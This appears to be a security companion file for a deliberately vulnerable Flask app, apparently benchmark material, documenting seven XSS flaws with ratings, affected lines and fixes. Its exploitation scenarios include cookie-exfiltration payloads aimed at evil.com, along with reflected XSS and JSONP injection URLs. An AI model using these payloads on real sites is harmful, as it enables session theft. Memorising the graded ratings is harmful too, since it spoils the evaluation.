# Security Companion Document: app.py

## Language Exclusion Note: C and C++

C and C++ are excluded from the XSS vulnerability class because they are not typical web templating languages. While C and C++ can serve HTTP responses (e.g., via libmicrohttpd or cpp-httplib), they do not have standard HTML templating engines or web frameworks that produce dynamic HTML in the way that Python (Flask/Jinja2), Java (Spring Boot/Thymeleaf), Go (html/template), Rust (Actix-web), and JavaScript (Express.js) do. XSS vulnerabilities arise from the interaction between server-side code and HTML rendering in a browser, which is a pattern native to higher-level web frameworks rather than systems programming languages.

---

## Vulnerability: Stored XSS via Post Title on Index Page

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Obvious
**Detection Difficulty:** Easily_Detectable
**Affected Lines:** L78-L80

### Description
The index route renders post titles directly into HTML using `"<h2>{}</h2>".format(post["title"])`. The `title` field is stored from user input without sanitization and rendered without escaping, allowing an attacker to inject arbitrary HTML and JavaScript through the post title.

### Exploitation Scenario
An attacker creates a new post with the title `<script>document.location='http://evil.com/?c='+document.cookie</script>`. When any user visits the home page, the script executes in their browser, stealing their session cookie.

### Remediation Guidance
Escape all user-supplied data before embedding in HTML:
```python
from markupsafe import escape
page += "<h2>{}</h2>".format(escape(post["title"]))
```

### Complexity Rationale
This is rated Obvious because user input flows directly from the database into an HTML format string with no escaping, a textbook stored XSS pattern.

### Detection Difficulty Rationale
This is rated Easily_Detectable because the direct string formatting of database content into HTML without escaping is a well-known pattern that SAST tools reliably flag.

---

## Vulnerability: Stored XSS via Comment Body on Post View Page

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Obvious
**Detection Difficulty:** Easily_Detectable
**Affected Lines:** L114-L115

### Description
The view_post route renders comment author and body fields directly into HTML using `"<strong>{}</strong>".format(comment["author"])` and `"<p>{}</p>".format(comment["body"])`. Comment content is stored from user input without sanitization and rendered without escaping.

### Exploitation Scenario
An attacker submits a comment with body `<img src=x onerror="fetch('http://evil.com/?c='+document.cookie)">`. When any user views the post, the onerror handler fires and exfiltrates their cookies.

### Remediation Guidance
Escape comment body before rendering:
```python
from markupsafe import escape
page += "<p>{}</p>".format(escape(comment["body"]))
```

### Complexity Rationale
This is rated Obvious because the comment body flows directly from the database into HTML output with no escaping applied.

### Detection Difficulty Rationale
This is rated Easily_Detectable because the pattern of formatting database content directly into HTML is a standard taint-flow pattern detected by most SAST tools.

---

## Vulnerability: Reflected XSS via Search Query Parameter

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Moderate
**Detection Difficulty:** Pattern_Dependent
**Affected Lines:** L176-L183

### Description
The search route reflects the query parameter `q` into the HTML page in two locations: the search input value attribute (`value="{}".format(query)` on line 178) and the results heading (`"<p>Results for: <em>{}</em></p>".format(query)` on line 183). Neither location escapes the user input. Additionally, the search highlighting logic on line 193-194 uses `post["title"].replace(query, ...)` which embeds the raw query into the replacement HTML.

### Exploitation Scenario
An attacker crafts a URL like `http://localhost:5002/search?q="><script>alert(document.cookie)</script>`. The query breaks out of the input value attribute and injects a script tag. Sharing this URL with a victim triggers the script in their browser.

### Remediation Guidance
Escape the query parameter before embedding in HTML:
```python
from markupsafe import escape
safe_query = escape(query)
page += '<input type="text" name="q" value="{}">'.format(safe_query)
page += "<p>Results for: <em>{}</em></p>".format(safe_query)
```

### Complexity Rationale
This is rated Moderate because the vulnerability appears in multiple output contexts (attribute value and HTML body) and the search highlighting logic adds an additional injection vector that a reviewer must trace through the string replacement.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because while the direct reflection of query parameters is detectable, the search highlighting replacement logic requires interprocedural taint tracking through the string replace operation.

---

## Vulnerability: Stored XSS via Profile Bio and Website Fields

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Moderate
**Detection Difficulty:** Pattern_Dependent
**Affected Lines:** L238-L242

### Description
The profile route renders the user's display name, bio, and website fields directly into HTML without escaping. The bio is rendered via `"<div><strong>Bio:</strong> {}</div>".format(user["bio"])` and the website is rendered into both an href attribute and link text via `'<a href="{}">{}</a>'.format(user["website"], user["website"])`. The website field is particularly dangerous as it allows injection into an href attribute.

### Exploitation Scenario
An attacker sets their website to `javascript:alert(document.cookie)` or their bio to `<script>fetch('http://evil.com/steal?c='+document.cookie)</script>`. When any user views the profile (via cookie-based lookup), the malicious content executes. The website href injection enables clickjacking via `javascript:` URIs.

### Remediation Guidance
Escape all profile fields and validate URLs:
```python
from markupsafe import escape
import urllib.parse
page += "<div><strong>Bio:</strong> {}</div>".format(escape(user["bio"]))
if user["website"].startswith(("http://", "https://")):
    page += '<a href="{}">{}</a>'.format(escape(user["website"]), escape(user["website"]))
```

### Complexity Rationale
This is rated Moderate because the vulnerability spans multiple fields and output contexts (HTML body and href attribute), and the data flow involves a cookie-based lookup to retrieve stored profile data before rendering.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools need to trace the data flow from form submission through database storage, cookie-based retrieval, and finally into HTML rendering across multiple output contexts.

---

## Vulnerability: Stored XSS via Preview Endpoint Content Field

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Nuanced
**Detection Difficulty:** Likely_Missed
**Affected Lines:** L265

### Description
The preview endpoint escapes the title using `html.escape(title)` but renders the content field directly without escaping via `"<div>{}</div>".format(content)`. The selective application of escaping creates a false sense of security — a reviewer seeing `html.escape` on the title may assume the content is also protected.

### Exploitation Scenario
An attacker submits a POST to `/preview` with content `<script>document.location='http://evil.com/?c='+document.cookie</script>`. The content renders unescaped in the response. This can be exploited via a CSRF-like attack where a malicious page auto-submits a form to the preview endpoint.

### Remediation Guidance
Apply escaping consistently to all user-supplied fields:
```python
page += "<div>{}</div>".format(html.escape(content))
```

### Complexity Rationale
This is rated Nuanced because the adjacent title field is properly escaped with `html.escape()`, creating a misleading pattern that suggests the developer was security-conscious. A reviewer must notice the inconsistency between the escaped title and the unescaped content.

### Detection Difficulty Rationale
This is rated Likely_Missed because the presence of `html.escape` on the title field may cause SAST tools to reduce the severity or skip the content field, and the vulnerability requires recognizing the inconsistent application of escaping within the same function.

---

## Vulnerability: Reflected XSS via Error Message Parameter

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Obvious
**Detection Difficulty:** Easily_Detectable
**Affected Lines:** L276

### Description
The error page route renders the `msg` query parameter directly into HTML using `"<div class='error'><p>{}</p></div>".format(message)`. The message parameter is taken from the URL query string without any escaping.

### Remediation Guidance
Escape the error message:
```python
page += "<div class='error'><p>{}</p></div>".format(html.escape(message))
```

### Exploitation Scenario
An attacker crafts a URL like `http://localhost:5002/error?msg=<script>alert('XSS')</script>` and shares it with a victim. The script executes when the victim clicks the link.

### Complexity Rationale
This is rated Obvious because the query parameter flows directly into HTML output with no intermediate processing or escaping.

### Detection Difficulty Rationale
This is rated Easily_Detectable because the direct reflection of a query parameter into HTML via string formatting is a textbook reflected XSS pattern.

---

## Vulnerability: JSONP Callback Injection

**CWE:** CWE-79
**OWASP:** A03
**Complexity Level:** Nuanced
**Detection Difficulty:** Likely_Missed
**Affected Lines:** L291-L293

### Description
The `/api/posts` endpoint supports a `callback` query parameter for JSONP responses. The callback value is embedded directly into the response without validation via `"{}({})".format(callback, data)`. An attacker can inject arbitrary JavaScript by providing a malicious callback value, and the response is served with `Content-Type: application/javascript`.

### Exploitation Scenario
An attacker crafts a URL like `http://localhost:5002/api/posts?callback=alert(document.cookie)//` which produces the response `alert(document.cookie)//(...)`. When loaded via a `<script>` tag on any page, this executes arbitrary JavaScript. More sophisticated attacks use `callback=document.write(String.fromCharCode(...))//` to inject full HTML pages.

### Remediation Guidance
Validate the callback parameter to allow only valid JavaScript identifiers:
```python
import re
if callback and re.match(r'^[a-zA-Z_$][a-zA-Z0-9_$]*$', callback):
    response = make_response("{}({})".format(callback, data))
```
Or better, remove JSONP support entirely and use CORS headers instead.

### Complexity Rationale
This is rated Nuanced because JSONP injection is a less commonly recognized XSS vector. The vulnerability is in an API endpoint rather than an HTML page, and the attack requires understanding how JSONP responses can be abused via script tag inclusion.

### Detection Difficulty Rationale
This is rated Likely_Missed because most SAST tools focus on HTML context XSS and may not flag JSONP callback injection as a cross-site scripting vulnerability, especially when the response Content-Type is `application/javascript`.
